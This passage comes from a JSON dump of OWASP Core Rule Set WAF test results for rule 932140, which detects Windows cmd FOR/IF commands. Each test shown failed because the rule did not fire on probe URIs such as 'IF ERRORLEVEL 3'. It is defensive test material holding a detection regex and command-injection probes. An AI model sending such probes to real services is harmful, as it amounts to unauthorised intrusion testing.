        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 115,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 115,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%22%251%22%3D%3D%22%2F%3F%22+...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 116,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 116,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%5B%251%5D%3D%3D%5B%2F%3F%5D+...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 117,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932271 - Remote Command Execution: Unix Shell Expression Found", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 117,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%22%25%7E1%22%3D%3D%22%2F%3F%22+...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 118,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 118,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+ERRORLEVEL+3+IF+NOT+ERRORLEVEL+4+...",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 119,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 119,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+NOT+DEFINED+BAR+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
